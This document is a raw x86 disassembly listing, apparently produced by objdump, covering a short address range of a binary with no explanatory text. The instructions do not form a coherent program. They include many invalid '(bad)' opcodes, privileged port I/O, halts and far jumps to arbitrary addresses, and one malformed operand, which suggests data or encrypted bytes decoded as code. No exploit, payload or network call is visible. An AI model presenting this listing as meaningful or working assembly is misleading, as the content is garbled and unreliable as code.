  40db21:	mov    ds:0xb6b0db14,eax
  40db26:	push   esp
  40db27:	add    ecx,DWORD PTR [edi+0x328580fa]
  40db2d:	dec    edx
  40db2e:	test   DWORD PTR [eax+edi*4-0x126e882c],0x276f1329
  40db39:	dec    ebx
  40db3a:	aad    0xb3
  40db3c:	pop    es
  40db3d:	inc    ecx
  40db3e:	dec    esi
  40db3f:	sar    BYTE PTR [ecx-0x40],cl
  40db42:	das    
  40db43:	enter  0x459b,0xc9
  40db47:	stc    
  40db48:	retf   
  40db49:	loope  0x40dae5
  40db4b:	aaa    
  40db4c:	out    0xe8,al
  40db4e:	in     al,dx
  40db4f:	popf   
  40db50:	adc    DWORD PTR [ecx-0xab5a055],esi
  40db56:	call   0xebea:0x59d4253
  40db5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db5e:	xchg   edi,eax
  40db5f:	add    BYTE PTR [edi-0x78a8af93],ch
  40db65:	hlt    
  40db66:	push   esi
  40db67:	mov    esp,0xa9a3f5b
  40db6c:	icebp  
  40db6d:	add    eax,0x98f61af3
  40db72:	dec    edi
  40db73:	bound  eax,QWORD PTR [ecx+0xc]
  40db76:	test   BYTE PTR [eax],cl
  40db78:	dec    ebx
  40db79:	outs   dx,BYTE PTR es:[esi]
  40db7b:	out    0xea,eax
  40db7d:	packsswb mm5,QWORD PTR [esp+esi*1]
  40db81:	jmp    0x39c0d349
  40db86:	sbb    DWORD PTR [esi],edi
  40db88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db89:	push   cs
  40db8a:	rol    DWORD PTR [ecx-0x47],0xe6
  40db8e:	in     eax,0xe5
  40db90:	aaa    
  40db91:	loope  0x40db13
  40db93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db94:	and    al,0x9b
  40db96:	sbb    al,0x6c
  40db98:	out    0xd6,al
  40db9a:	sub    esi,esi
  40db9c:	pop    ebp
  40db9d:	xchg   edi,eax
  40db9e:	xlat   BYTE PTR ds:[ebx]
  40db9f:	repz out dx,eax
  40dba1:	pop    ebp
  40dba2:	xor    dh,BYTE PTR [esi]
  40dba4:	test   eax,0x44ede1df
  40dba9:	stos   DWORD PTR es:[edi],eax
  40dbaa:	std    
  40dbab:	push   esi
  40dbac:	mov    esp,0x56a61b5d
  40dbb1:	inc    ecx
  40dbb2:	xchg   ebp,eax
  40dbb3:	shl    DWORD PTR cs:[edi],1
  40dbb6:	dec    eax
  40dbb7:	inc    eax
  40dbb8:	jge    0x40dbd9
  40dbba:	(bad)  
  40dbbb:	lea    ebx,[ebp+ebx*8+0x13cbaad4]
  40dbc2:	mov    ecx,0x209fd63e
  40dbc7:	aad    0x8b
  40dbc9:	dec    ebp
  40dbca:	shr    DWORD PTR [esi+0x67],1
  40dbcd:	test   eax,0x13222953
  40dbd2:	inc    esp
  40dbd3:	scas   al,BYTE PTR es:[edi]
  40dbd4:	test   BYTE PTR [ebx+0x48971f11],ch
  40dbda:	in     al,0x35
  40dbdc:	dec    eax
  40dbdd:	in     al,dx
  40dbde:	jno    0x40db86
  40dbe0:	xchg   ecx,eax
  40dbe1:	push   esp
  40dbe2:	imul   sp,WORD PTR [ebx+eax*4-0x48ed8b82],0x4e
  40dbeb:	stos   BYTE PTR es:[edi],al
  40dbec:	sub    al,0x79
  40dbee:	cdq    
  40dbef:	mov    al,0xe7
  40dbf1:	loopne 0x40dc6a
  40dbf3:	cdq    
  40dbf4:	rol    BYTE PTR [ebp+0x4b],cl
  40dbf7:	out    0xc8,eax
  40dbf9:	pop    es
  40dbfa:	std    
  40dbfb:	jecxz  0x40dba1
  40dbfd:	mov    ds:0x2345fcfe,eax
  40dc02:	loop   0x40dbb6
  40dc04:	jnp    0x40dbff
  40dc06:	or     al,BYTE PTR [ebp+0x17]
  40dc09:	xor    al,0xe
  40dc0b:	inc    ebp
  40dc0c:	mov    eax,0x9e9da967
  40dc11:	inc    eax
  40dc12:	(bad)  
  40dc13:	pop    ss
  40dc14:	push   esp
  40dc15:	push   0x5
  40dc17:	pop    es
  40dc18:	es pop esi
  40dc1a:	push   0x4e
  40dc1c:	scas   al,BYTE PTR es:[edi]
  40dc1d:	and    ah,BYTE PTR [ecx-0x3f]
  40dc20:	xchg   edx,eax
  40dc21:	push   ds
  40dc22:	sub    edx,esp
  40dc24:	adc    al,BYTE PTR [eax+0x2d63dc76]
  40dc2a:	xchg   ebp,eax
  40dc2b:	sbb    al,0xa4
  40dc2d:	out    dx,al
  40dc2e:	add    DWORD PTR [ecx],esi
  40dc30:	and    DWORD PTR [edi],0x107fae1e
  40dc36:	push   ecx
  40dc37:	push   edi
  40dc38:	not    DWORD PTR [eax]
  40dc3a:	xor    eax,0x2a611cee
  40dc3f:	jbe    0x40dcac
  40dc41:	mov    ecx,0x827ece90
  40dc46:	enter  0x6e6b,0xd4
  40dc4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc4b:	sbb    DWORD PTR [esi-0x15],ebx
  40dc4e:	cli    
  40dc4f:	imul   BYTE PTR [ecx+0x6b]
  40dc52:	mov    ds:0x5f555d41,eax
  40dc57:	adc    ch,ch
  40dc59:	and    eax,0xa05d9d7e
  40dc5e:	pop    ecx
  40dc5f:	inc    esi
  40dc60:	and    eax,0xef5f2d43
  40dc65:	sbb    edx,ecx
  40dc67:	rol    DWORD PTR [esi+eiz*2],0x3b
  40dc6b:	sar    DWORD PTR ds:0xd7c58807,0xeb
  40dc72:	cmp    bh,BYTE PTR [ebx]
  40dc74:	xchg   edx,eax
  40dc75:	or     al,BYTE PTR [esi+0x32]
  40dc78:	nop
  40dc79:	pop    ebp
  40dc7a:	gs push esp
  40dc7c:	fst    DWORD PTR [ebx-0x4abda138]
  40dc82:	rol    ecx,0x31
  40dc85:	sbb    DWORD PTR [ebx+0x37],0xfffffffc
  40dc89:	jae    0x40dc45
  40dc8b:	retf   
  40dc8c:	dec    esi
  40dc8d:	pop    ebx
  40dc8e:	into   
  40dc8f:	xchg   ebp,eax
  40dc90:	pop    es
  40dc91:	shl    DWORD PTR [edx+edx*2+0x17fe1f23],cl
  40dc98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc99:	jmp    0xa1b153a7
  40dc9e:	pop    ebp
  40dc9f:	xchg   ebx,eax
  40dca0:	sti    
  40dca1:	ja     0x40dcd3
  40dca3:	out    dx,eax
  40dca4:	push   ebx
  40dca5:	popa   
  40dca6:	inc    esi
  40dca7:	rcl    DWORD PTR [edx+eax*2],1
  40dcaa:	ret    0xa155
  40dcad:	push   es
  40dcae:	dec    ebp
  40dcaf:	dec    edi
  40dcb0:	dec    ecx
  40dcb1:	retf   0x7733
  40dcb4:	jmp    0x40dcb9
  40dcb6:	pop    ebp
  40dcb7:	add    bl,BYTE PTR [eax+0x33]
  40dcba:	xor    eax,DWORD PTR [ecx]
  40dcbc:	sbb    DWORD PTR [edi+0x4b],edx
  40dcbf:	pop    ecx
  40dcc0:	lods   al,BYTE PTR ds:[esi]
  40dcc1:	stos   DWORD PTR es:[edi],eax
  40dcc2:	dec    edx
  40dcc3:	lods   al,BYTE PTR ds:[esi]
  40dcc4:	shr    BYTE PTR [edi+eiz*8+0x3f],cl
  40dcc8:	gs dec edx
  40dcca:	cmp    eax,DWORD PTR [edi+esi*1]
  40dccd:	outs   dx,BYTE PTR ds:[esi]
  40dcce:	les    esp,FWORD PTR [eax+0x57]
  40dcd1:	(bad)  
  40dcd2:	std    
  40dcd3:	mov    ebx,0xa707af17
  40dcd8:	shl    al,cl
  40dcda:	jecxz  0x40dcc1
  40dcdc:	shr    ebp,0xc2
  40dcdf:	pusha  
  40dce0:	retf   0xf99d
  40dce3:	cld    
  40dce4:	sub    BYTE PTR [ebx],dl
  40dce6:	popf   
  40dce7:	inc    ecx
  40dce8:	xor    al,0x78
  40dcea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dceb:	dec    esp
  40dcec:	addr16 xor esp,ecx
  40dcef:	cmp    BYTE PTR [eax],bl
  40dcf1:	mov    ebx,0xb62b7a4a
  40dcf6:	lahf   
  40dcf7:	push   ss
  40dcf8:	jecxz  0x40dd6e
  40dcfa:	dec    ebx
  40dcfb:	mov    ecx,0x32acfd99
  40dd00:	mov    al,0xc4
  40dd02:	mov    ds:0x181cf20c,al
  40dd07:	loopne 0x40dd1d
  40dd09:	rol    DWORD PTR [ebp+0x22],cl
  40dd0c:	fs retf 0xbc74
  40dd10:	push   ecx
  40dd11:	sti    
  40dd12:	dec    esp
  40dd13:	stos   DWORD PTR es:[edi],eax
  40dd14:	cmp    ecx,0x2e
  40dd17:	sub    bl,bh
  40dd19:	dec    esp
  40dd1a:	mul    BYTE PTR [ebx-0x5449d874]
  40dd20:	push   ecx
  40dd21:	outs   dx,BYTE PTR ds:[esi]
  40dd22:	(bad)  
  40dd23:	mov    ecx,0x7cffd33f
  40dd28:	scas   eax,DWORD PTR es:[edi]
  40dd29:	add    BYTE PTR [edi+0x5f6b889c],cl
  40dd2f:	pop    ss
  40dd30:	test   al,0xbd
  40dd32:	neg    DWORD PTR cs:[esi-0x29b2d417]
  40dd39:	mov    bl,0x2d
  40dd3b:	inc    ebx
  40dd3c:	jo     0x40dd8f
  40dd3e:	push   edi
  40dd3f:	jno    0x40dd68
  40dd41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd42:	xchg   ecx,eax
  40dd43:	cld    
  40dd44:	dec    ebx
  40dd45:	xchg   DWORD PTR [ebx-0x3e],ecx
  40dd48:	ret    0x6cd4
  40dd4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd4c:	icebp  
  40dd4d:	lock scas al,BYTE PTR es:[edi]
  40dd4f:	pop    ebp
  40dd50:	pop    eax
  40dd51:	cmp    edx,DWORD PTR [eax]
  40dd53:	call   0xf1335fa5
  40dd58:	int    0x87
  40dd5a:	ins    DWORD PTR es:[edi],dx
  40dd5b:	and    al,0x2d
  40dd5d:	mov    ch,0x64
  40dd5f:	aam    0x6b
  40dd61:	push   ebx
  40dd62:	loope  0x40ddd1
  40dd64:	pop    ss
  40dd65:	aas    
  40dd66:	icebp  
  40dd67:	(bad)  
  40dd68:	ins    BYTE PTR es:[edi],dx
  40dd69:	lods   eax,DWORD PTR ds:[esi]
  40dd6a:	scas   al,BYTE PTR es:[edi]
  40dd6b:	pop    edi
  40dd6c:	outs   dx,DWORD PTR ds:[esi]
  40dd6d:	push   ebp
  40dd6e:	push   esi
  40dd6f:	pop    ds
  40dd70:	mov    al,ds:0x89c265e3
  40dd75:	push   cs
  40dd76:	mov    bh,0x1b
  40dd78:	sub    ebp,DWORD PTR [ecx+eax*8-0x47]
  40dd7c:	mov    al,ds:0x1cd40c88
  40dd81:	or     DWORD PTR [ecx],ecx
  40dd83:	add    DWORD PTR [ecx-0x43],edi
  40dd86:	ss repz sbb bh,ah
  40dd8a:	stos   DWORD PTR es:[edi],eax
  40dd8b:	sbb    esp,DWORD PTR [edx+0x9]
  40dd8e:	retf   0x142b
  40dd91:	sahf   
  40dd92:	das    
  40dd93:	scas   eax,DWORD PTR es:[edi]
  40dd94:	jns    0x40dddf
  40dd96:	mov    edi,0xa056b5be
  40dd9b:	(bad)
  40dda0:	imul   BYTE PTR [ebx-0x2c]
  40dda3:	dec    ecx
  40dda4:	xchg   ecx,eax
  40dda5:	(bad)  
  40dda6:	jne    0x40dd6a
  40dda8:	push   es
  40dda9:	les    edx,FWORD PTR [edx-0x4c]
  40ddac:	sub    eax,0xe017f5d5
  40ddb1:	in     eax,dx
  40ddb2:	repnz test eax,0x13dc7234
  40ddb8:	rcr    dh,0xe5
  40ddbb:	and    eax,0x6e4dbf0
  40ddc0:	rol    bl,cl
  40ddc2:	cmp    BYTE PTR [ecx],dh
  40ddc4:	cmp    edi,DWORD PTR [ebp-0x11]
  40ddc7:	fdiv   QWORD PTR [ebx-0x4]
  40ddca:	pop    edx
  40ddcb:	jmp    0xe3c4ed2f
  40ddd0:	sbb    bl,BYTE PTR [ecx-0x7680a636]
  40ddd6:	pop    ebx
  40ddd7:	call   0x8305bc24
  40dddc:	retf   
  40dddd:	dec    ebx
  40ddde:	pop    ss
  40dddf:	retf   0x5b62
  40dde2:	in     eax,dx
  40dde3:	mov    ch,0x83
  40dde5:	jnp    0x40ddf2
  40dde7:	aaa    
  40dde8:	es jecxz 0x40de4c
  40ddeb:	mov    ds:0x6e1ea868,eax
  40ddf0:	inc    esp
  40ddf1:	ret    0x7d6
  40ddf4:	or     DWORD PTR [ebx],ebp
  40ddf6:	and    DWORD PTR [ecx+0x70],0x54377851
  40ddfd:	ss scas eax,DWORD PTR es:[edi]
  40ddff:	add    eax,0x2be1832e
  40de04:	clc    
  40de05:	and    eax,0x2129c114
  40de0a:	jb     0x40de85
  40de0c:	call   0x2dc10f04
  40de11:	adc    DWORD PTR [eax-0x5daf4839],ebp
  40de17:	sub    DWORD PTR [edi+0x10d96248],edx
  40de1d:	xor    dh,al
  40de1f:	jbe    0x40ddb4
  40de21:	fs retf 
  40de23:	(bad)
  40de27:	push   es
  40de28:	in     eax,0xc0
  40de2a:	sbb    eax,0x431ad6c8
  40de2f:	es mov ah,0x26
  40de32:	and    BYTE PTR [edx+0x48],0x13
  40de36:	xchg   esp,eax
  40de37:	jl     0x40de2c
  40de39:	jl     0x40de38
  40de3b:	mov    eax,0x104ba553
  40de40:	out    0x15,al
  40de42:	enter  0xbe32,0xc3
  40de46:	int    0x1
  40de48:	mov    ecx,ecx
  40de4a:	outs   dx,BYTE PTR ds:[esi]
  40de4b:	jb     0x40dea5
  40de4d:	add    ebx,DWORD PTR [ebx-0x4e2e7bdc]
  40de53:	outs   dx,BYTE PTR ds:[esi]
  40de54:	xor    BYTE PTR [edi-0xb],al
  40de57:	sub    bl,BYTE PTR [edx-0x49]
  40de5a:	jg     0x40de8e
  40de5c:	loopne 0x40de6e
  40de5e:	mov    dl,0xab
  40de60:	inc    ebp
  40de61:	test   bl,bh
  40de63:	sub    BYTE PTR [ebx-0x60764148],dh
  40de69:	shr    DWORD PTR [ecx+ebx*1-0x37],0x88
  40de6e:	loopne 0x40debb
  40de70:	inc    esi
  40de71:	out    dx,al
  40de72:	mov    dl,0x9b
  40de74:	in     eax,dx
  40de75:	fsub   st(2),st
  40de77:	inc    ecx
  40de78:	mov    ds:0x54a603b1,eax
  40de7d:	and    esi,ecx
  40de7f:	dec    ebx
  40de80:	(bad)  
  40de81:	xor    BYTE PTR [esi],dl
  40de83:	jg     0x40de39
  40de85:	pop    ds
  40de86:	aaa    
  40de87:	sbb    al,0xbf
  40de89:	mov    WORD PTR [ecx-0x38],cs
  40de8c:	loopne 0x40de32
  40de8e:	ins    BYTE PTR es:[edi],dx
  40de8f:	or     esp,DWORD PTR [ecx+0x2d]
  40de92:	or     BYTE PTR [bp+di-0x8],bl
  40de96:	jb     0x40de5e
  40de98:	int3   
  40de99:	iret   
  40de9a:	mov    ebp,es
  40de9c:	push   ecx
  40de9d:	popa   
  40de9e:	mov    al,0x66
  40dea0:	xor    al,BYTE PTR [eax-0x60]
  40dea3:	xchg   ebp,eax
  40dea4:	jnp    0x40de9b
  40dea6:	inc    esi
  40dea7:	inc    esp
  40dea8:	adc    al,0xf9
  40deaa:	cld    
  40deab:	dec    edi
  40deac:	mov    ebx,ecx
  40deae:	xchg   ebx,eax
  40deaf:	push   eax
  40deb0:	or     esp,edi
  40deb2:	adc    DWORD PTR [eax-0x33],edi
  40deb5:	add    DWORD PTR [ebp-0x3d],eax
  40deb8:	push   ds
  40deb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deba:	mov    edx,0x3d62ccfd
  40debf:	xchg   DWORD PTR [edx],ecx
  40dec1:	call   0xf539f178
  40dec6:	sbb    eax,0x2a45452d
  40decb:	cmc    
  40decc:	repz mov esi,0xb4802c90
  40ded2:	mov    bl,0x41
  40ded4:	sbb    al,0x3d
  40ded6:	sbb    edi,DWORD PTR [ebp-0x3d8926aa]
  40dedc:	sbb    al,0xd2
  40dede:	adc    ch,BYTE PTR [eax-0x7b414d8b]
  40dee4:	int3   
  40dee5:	cmp    bh,dl
  40dee7:	cdq    
  40dee8:	or     BYTE PTR [ebp-0x20ad26ca],0x93
  40deef:	push   ss
  40def0:	or     al,0x93
  40def2:	jle    0x40df0a
  40def4:	out    0x8,al
  40def6:	call   0x68c9:0xadd130fe
  40defd:	cs (bad) 
  40deff:	jl     0x40de88
  40df01:	mov    ebx,0xbaad6217
  40df06:	jg     0x40de93
  40df08:	mul    DWORD PTR [esi-0x55]
  40df0b:	xchg   edi,eax
  40df0c:	outs   dx,DWORD PTR ds:[esi]
  40df0d:	mov    edx,0x4728ddd3
  40df12:	push   ds
  40df13:	hlt    
  40df14:	mov    ebp,0x7bbfff6
  40df19:	(bad)  
  40df1a:	neg    BYTE PTR [edi+0x69746bd0]
  40df20:	std    
  40df21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df22:	inc    esp
  40df23:	sti    
  40df24:	fdivr  st(0),st
  40df26:	cmp    eax,0xee7e444
  40df2b:	push   ebx
  40df2c:	xor    eax,0x3ce7e82a
  40df31:	fst    DWORD PTR [ebx+0x3]
  40df34:	rcl    DWORD PTR [eax+edx*2],0x31
  40df38:	das    
  40df39:	in     al,dx
  40df3a:	xor    al,0xb7
  40df3c:	xlat   BYTE PTR ds:[ebx]
  40df3d:	repnz enter 0x7151,0x87
  40df42:	or     DWORD PTR [eax-0x44a9f854],eax
  40df48:	sub    esi,DWORD PTR ds:0x43861805
  40df4e:	mov    al,ds:0xef11b04a
  40df53:	pop    ebx
  40df54:	fstp   TBYTE PTR fs:[ebx+0x6dd3f742]
  40df5b:	pop    eax
  40df5c:	sub    DWORD PTR [edi-0x13],esp
  40df5f:	aad    0xba
  40df61:	jg     0x40df97
  40df63:	sub    DWORD PTR es:[edi],eax
  40df66:	in     al,0x49
  40df68:	out    dx,al
  40df69:	sub    BYTE PTR [ebx],0x89
  40df6c:	sub    eax,0xdfad5649
  40df71:	dec    esp
  40df72:	lahf   
  40df73:	jno    0x40df7c
  40df75:	cmp    bh,BYTE PTR [eiz*2+0xc196c15]
  40df7c:	pop    edx
  40df7d:	leave  
  40df7e:	sub    BYTE PTR [eax+0xd2a0df6],dh
  40df84:	jl     0x40dfcc
  40df86:	arpl   WORD PTR [ebp+0x4e35923],cx
  40df8c:	dec    eax
  40df8d:	dec    ebp
  40df8e:	out    dx,al
  40df8f:	cmp    ecx,DWORD PTR [esi+0x358496fe]
  40df95:	mov    ebx,0x2932cb58
  40df9a:	jae    0x40dfe6
  40df9c:	xchg   bh,ch
  40df9e:	retf   0x5e48
  40dfa1:	call   0xcf13:0x1d6d06a1
  40dfa8:	leave  
  40dfa9:	mov    ds,WORD PTR [edx+0x94ecef0]
  40dfaf:	cdq    
  40dfb0:	cmp    eax,0x10b5abfe
  40dfb5:	scas   al,BYTE PTR es:[edi]
  40dfb6:	nop
  40dfb7:	pop    eax
  40dfb8:	hlt    
  40dfb9:	test   al,0x90
  40dfbb:	rcr    DWORD PTR [ecx+eiz*2-0x2abf89ea],0x6
  40dfc3:	jl     0x40df54
  40dfc5:	repnz xor DWORD PTR [esi-0x1b],ebp
  40dfc9:	retf   0x8f9a
  40dfcc:	mov    es,WORD PTR [edi-0x33847303]
  40dfd2:	inc    edx
  40dfd3:	stos   DWORD PTR es:[edi],eax
  40dfd4:	jo     0x40df63
  40dfd6:	inc    esp
  40dfd7:	inc    edi
  40dfd8:	adc    eax,DWORD PTR [esp+ebx*2]
  40dfdb:	inc    ecx
  40dfdc:	ftst   
  40dfde:	cmc    
  40dfdf:	pop    eax
  40dfe0:	shl    DWORD PTR [eax+esi*1-0x3cfb1652],cl
  40dfe7:	dec    esi
  40dfe8:	fmul   DWORD PTR [eax-0x6d2e7f78]
  40dfee:	imul   ebx,DWORD PTR [ebx+0x64],0xfffffff3
  40dff2:	mov    dh,0x4
  40dff4:	inc    edx
  40dff5:	or     ebx,eax
  40dff7:	and    ebp,DWORD PTR [ebx]
  40dff9:	out    dx,eax
  40dffa:	into   
  40dffb:	aad    0x2f
  40dffd:	inc    ebx
  40dffe:	xor    dl,BYTE PTR [ebp+0x2bec034c]
  40e004:	adc    eax,0xe56f77c8
  40e009:	and    bl,BYTE PTR [ebp-0x76f7b690]
  40e00f:	daa    
  40e010:	aas    
  40e011:	cmp    DWORD PTR [esi+0xd],ebx
  40e014:	push   ebp
  40e015:	imul   edx,esi,0xffffff8d
  40e018:	cmp    al,0xca
  40e01a:	cs pushf 
  40e01c:	loope  0x40e035
  40e01e:	leave  
  40e01f:	imul   ecx,DWORD PTR [edx+0x63],0xffffffa9
  40e023:	mov    ch,0x33
  40e025:	scas   al,BYTE PTR es:[edi]
  40e026:	sahf   
  40e027:	test   DWORD PTR [eax],ebp
  40e029:	xchg   ah,cl
  40e02b:	mov    ds,WORD PTR [edi]
  40e02d:	das    
  40e02e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e02f:	pop    eax
  40e030:	pop    ecx
  40e031:	and    BYTE PTR [edx],dl
  40e033:	jl     0x40e070
  40e035:	xor    bl,ah
  40e037:	dec    BYTE PTR [ecx]
  40e039:	stc    
  40e03a:	add    esp,esp
  40e03c:	pop    eax
  40e03d:	test   BYTE PTR [ecx-0x343d9bbc],bl
  40e043:	stos   DWORD PTR es:[edi],eax
  40e044:	rol    cl,1
  40e046:	or     al,dh
  40e048:	fs xchg edx,eax
  40e04a:	pop    es
  40e04b:	mov    BYTE PTR [esi+eiz*4],al
  40e04e:	jno    0x40dff3
  40e050:	fnstcw WORD PTR [edi-0x1a857d89]
  40e056:	aaa    
  40e057:	aam    0x16
  40e059:	and    eax,0xde1c82e1
  40e05e:	cmp    al,0x47
  40e060:	sub    al,0xa2
  40e062:	shl    bl,cl
  40e064:	pop    ss
  40e065:	int    0x14
  40e067:	or     DWORD PTR [ecx-0x71],esp
  40e06a:	outs   dx,DWORD PTR ds:[esi]
  40e06b:	mov    dl,bl
  40e06d:	jp     0x40e081
  40e06f:	pop    es
  40e070:	icebp  
  40e071:	test   al,0xe
  40e073:	xlat   BYTE PTR ds:[ebx]
  40e074:	adc    BYTE PTR [ecx+0x790551ba],dl
  40e07a:	sub    dl,bh
  40e07c:	sub    al,0xef
  40e07e:	(bad)  
  40e07f:	out    dx,eax
  40e080:	das    
  40e081:	sub    BYTE PTR [ebp-0x3f],0x2c
  40e085:	(bad)
  40e089:	rol    BYTE PTR [edx],1
  40e08b:	xchg   BYTE PTR [ebx+0x644b2a5a],bl
  40e091:	pop    eax
  40e092:	inc    esp
  40e093:	loop   0x40e0be
  40e095:	std    
  40e096:	or     BYTE PTR [ebx],0xce
  40e099:	pop    ebp
  40e09a:	popf   
  40e09b:	mov    BYTE PTR [edi-0x30e95c8d],bl
  40e0a1:	xor    bl,BYTE PTR [ecx]
  40e0a3:	pop    esi
  40e0a4:	push   ebx
  40e0a5:	pop    esp
  40e0a6:	cld    
  40e0a7:	inc    esp
  40e0a8:	imul   ebp,DWORD PTR [eax],0xffffff99
  40e0ab:	push   ds
  40e0ac:	cmp    DWORD PTR [edx+0x7ce0ecf0],esp
  40e0b2:	pop    ebx
  40e0b3:	pop    ss
  40e0b4:	mov    ebp,0xb9c31a00
  40e0b9:	mov    al,ds:0x1d8b1456
  40e0be:	mov    ?,ebp
  40e0c0:	ret    
  40e0c1:	push   eax
  40e0c2:	adc    bl,BYTE PTR [ebx+0x4]
  40e0c5:	jmp    0xdf0b:0xc3895549
  40e0cc:	jmp    0x855a:0x9455e7e8
  40e0d3:	js     0x40e058
  40e0d5:	sub    eax,0xac567186
  40e0da:	add    BYTE PTR [edi],ch
  40e0dc:	(bad)  
  40e0dd:	cmp    BYTE PTR [ebp-0x66],bh
  40e0e0:	mov    edi,0x35f14f5a
  40e0e5:	loope  0x40e0e2
  40e0e7:	(bad)  
  40e0e8:	scas   eax,DWORD PTR es:[edi]
  40e0e9:	sub    esi,DWORD PTR [esi]
  40e0eb:	push   eax
  40e0ec:	or     DWORD PTR [ecx+0x70],edi
  40e0ef:	enter  0x5b0c,0xdd
  40e0f3:	call   0x64c3:0x62594808
  40e0fa:	xor    BYTE PTR [esi-0x6f],bl
  40e0fd:	int3   
  40e0fe:	fwait
  40e0ff:	daa    
  40e100:	addr16 js 0x40e11e
  40e103:	imul   ebp,DWORD PTR [eax+0x55],0xffffff83
  40e107:	fmul   QWORD PTR [ebx]
  40e109:	ret    
  40e10a:	in     eax,0xe6
  40e10c:	mov    ds:0xe261aae4,eax
  40e111:	mov    eax,0xd64087f8
  40e116:	sbb    al,0x6e
  40e118:	sti    
  40e119:	psrlq  mm7,QWORD PTR [ecx-0x2c]
  40e11d:	push   ss
  40e11e:	dec    edi
  40e11f:	jg     0x40e113
  40e121:	nop
  40e122:	loope  0x40e17a
  40e124:	jne    0x40e10a
  40e126:	ins    BYTE PTR es:[edi],dx
  40e127:	popf   
  40e128:	mov    eax,0x4f57194a
  40e12d:	cmc    
  40e12e:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e130:	loop   0x40e155
  40e132:	inc    edx
  40e133:	xor    al,0x75
  40e135:	(bad)  
  40e137:	dec    eax
  40e138:	ds gs popf 
  40e13b:	js     0x40e0d1
  40e13d:	leave  
  40e13e:	mov    ecx,0xd66b9471
  40e143:	outs   dx,DWORD PTR ds:[esi]
  40e144:	mov    cl,0x9
  40e146:	adc    BYTE PTR [edi-0x5668431e],dl
  40e14c:	and    al,0xbb
  40e14e:	test   BYTE PTR [edi+0x2e],0x98
  40e152:	jl     0x40e19d
  40e154:	fmul   DWORD PTR [edx]
  40e156:	add    eax,0xc0ab905f
  40e15b:	add    dl,bl
  40e15d:	jbe    0x40e13c
  40e15f:	lds    eax,FWORD PTR [edx-0x7280dc82]
  40e165:	or     eax,DWORD PTR [ebx-0x47]
  40e168:	mov    dl,0x8b
  40e16a:	repz imul edx,ecx,0xffffff83
  40e16e:	inc    esi
  40e16f:	jns    0x40e165
  40e171:	popf   
  40e172:	daa    
  40e173:	adc    BYTE PTR [edi],cl
  40e175:	xchg   edx,eax
  40e176:	clc    
  40e177:	in     eax,0x78
  40e179:	shr    DWORD PTR [eax+esi*2],0x7d
  40e17d:	lock test al,0x8f
  40e180:	jg     0x40e128
  40e182:	nop
  40e183:	sbb    al,BYTE PTR [ebx+0x70]
  40e186:	(bad)  
  40e187:	aad    0x79
  40e189:	adc    eax,0x734dc540
  40e18e:	jo     0x40e205
  40e190:	lods   eax,DWORD PTR ds:[esi]
  40e191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e192:	push   0x71d770f2
  40e197:	and    ebp,DWORD PTR [esi]
  40e199:	call   0xd82b3002
  40e19e:	mov    ah,0xa
  40e1a0:	or     ch,BYTE PTR [bp+di+0x43bf]
  40e1a5:	add    ebx,DWORD PTR [edi+esi*8]
  40e1a8:	imul   ecx,esi,0x40
  40e1ab:	pop    ecx
  40e1ac:	mov    edx,0x7f83fca7
  40e1b1:	aas    
  40e1b2:	mov    ebp,0xf69ae58f
  40e1b7:	mov    eax,ds:0xa525b772
  40e1bc:	sbb    edx,esi
  40e1be:	in     eax,dx
  40e1bf:	into   
  40e1c0:	or     al,0x5c
  40e1c2:	(bad)  
  40e1c3:	mov    edi,0xaebe0e5
  40e1c8:	mov    eax,DWORD PTR [ebp-0x75]
  40e1cb:	mov    esp,0xab8bb590
  40e1d0:	mov    al,0x4a
  40e1d2:	mov    esi,0x68af86c9
  40e1d7:	pop    ebp
  40e1d8:	lds    eax,FWORD PTR [eax-0x7367ce4e]
  40e1de:	sbb    ebx,DWORD PTR [edi-0x3d4892af]
  40e1e4:	clc    
  40e1e5:	cmp    ebx,DWORD PTR [edx+0x56]
  40e1e8:	jbe    0x40e172
  40e1ea:	out    dx,al
  40e1eb:	in     al,dx
  40e1ec:	shr    DWORD PTR [ecx-0x112c1935],1
  40e1f2:	mov    esi,0x556db73d
  40e1f7:	arpl   WORD PTR [ebx-0x50],di
  40e1fa:	call   0xf14a:0xa053fc07
  40e201:	arpl   WORD PTR [eax],dx
  40e203:	adc    esi,esp
  40e205:	daa    
  40e206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e207:	popf   
  40e208:	(bad)  
  40e209:	xchg   esi,eax
  40e20a:	pop    ebp
  40e20b:	inc    ebx
  40e20c:	push   ebp
  40e20d:	cs push edx
  40e20f:	scas   eax,DWORD PTR es:[edi]
  40e210:	add    esi,ebx
  40e212:	mov    DWORD PTR [edi+0x7f14af7a],edi
  40e218:	mov    BYTE PTR [edi-0x40],bl
  40e21b:	aaa    
  40e21c:	arpl   WORD PTR [esp+esi*2-0x284eab67],cx
  40e223:	xchg   ebx,eax
  40e224:	mov    eax,0xf6fd4f6f
  40e229:	out    dx,al
  40e22a:	dec    ebx
  40e22b:	aas    
  40e22c:	xchg   dh,bh
  40e22e:	mov    bh,0xf7
  40e230:	xor    eax,0x54c810af
  40e235:	sbb    ch,BYTE PTR [esi]
  40e237:	or     al,BYTE PTR [edi+edi*1]
  40e23a:	into   
  40e23b:	pop    es
  40e23c:	sar    DWORD PTR [edx],cl
  40e23e:	jg     0x40e2b5
  40e240:	push   0x16
  40e242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e243:	cmp    ebx,0xff8f3424
  40e249:	lahf   
  40e24a:	les    ebx,FWORD PTR [esi-0x39]
  40e24d:	jae    0x40e215
  40e24f:	cmp    eax,0xdc0c9ad9
  40e254:	pop    ebp
  40e255:	icebp  
  40e256:	rol    DWORD PTR [ebp-0x545f6df4],cl
